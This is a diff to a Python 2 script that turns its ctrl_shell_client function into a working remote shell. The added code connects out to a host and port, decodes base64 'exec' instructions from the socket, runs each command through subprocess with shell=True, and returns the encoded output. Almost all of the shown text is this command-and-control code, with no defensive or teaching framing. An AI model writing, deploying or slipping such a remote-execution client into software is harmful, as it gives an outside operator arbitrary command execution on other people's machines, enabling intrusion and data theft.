@@ -1,11 +1,14 @@
 #!/usr/bin/env python
 
+import re
 import sys
 import time
+import base64
 import socket
 import urllib2
 import argparse
 import logging as log
+import subprocess as sp
 from datetime import datetime
 
 SIZE = 1024
@@ -38,8 +41,37 @@ def is_active(host, port):
 def ctrl_shell_client(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
-    s.recv(SIZE)
+    while True:
+        inp = s.recv(SIZE)
+        inp = base64.b64decode(inp)
+        if inp == 'fin':
+            break
+        elif re.search('^exec (".+"\ )+$', inp + ' '):
+            ctrl_shell_exec(s, inp)
     s.close()
+
+
+def ctrl_shell_exec(s, inp):
+    stdout = ''
+    cmds = parse_exec_cmds(inp)
+    for cmd in cmds:
+        stdout += '==========\n\n$ {}\n'.format(cmd)
+        stdout += sp.Popen(cmd, stdout=sp.PIPE, shell=True).communicate()[0]
+    stdout = base64.b64encode(stdout)
+    s.send(stdout)
+
+
+def parse_exec_cmds(inp):
+    cmds = []
+    inp = inp[5:]
+    num_cmds = len(re.findall('"', inp)) / 2
+    for i in range(num_cmds):
+        first = inp.find('"')
+        second = inp.find('"', first+1)
+        cmd = inp[first+1:second]
+        cmds.append(cmd)
+        inp = inp[second+2:]
+    return cmds
 
 
 def main():
